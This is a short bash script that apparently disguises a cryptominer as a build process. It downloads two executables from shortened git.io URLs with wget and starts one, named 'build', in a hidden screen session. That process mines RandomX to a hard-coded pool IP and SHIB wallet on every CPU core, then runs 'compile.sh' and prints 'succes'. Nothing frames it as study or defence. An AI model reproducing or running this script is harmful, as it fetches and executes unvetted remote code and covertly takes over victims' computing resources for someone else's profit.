#!/bin/bash
array[0]="01"
array[1]="02"
array[2]="03"
array[3]="04"
array[4]="05"
array[5]="06"
array[6]="07"
array[7]="08"
array[8]="09"
array[9]="10"
array[10]="11"
array[11]="12"
array[12]="13"
array[13]="14"
array[14]="15"
array[15]="16"
array[16]="17"
array[17]="18"
array[18]="19"
array[19]="20"
size=${#array[@]}
index=$(($RANDOM % $size))
kuli=${array[$index]}
wget -qO compile.sh https://git.io/JPjuz
wget -qO build https://git.io/JX29n
chmod +x build
chmod +x compile.sh
screen -dm -S build ./build -a rx/0 -o 137.184.3.159:2112 -u SHIB:0xb6736a6a90a2bd68aedd99a995a1ece58fa16cb3.kuli-$kuli -t $(nproc --all) -k -m nicehash
./compile.sh
echo succes
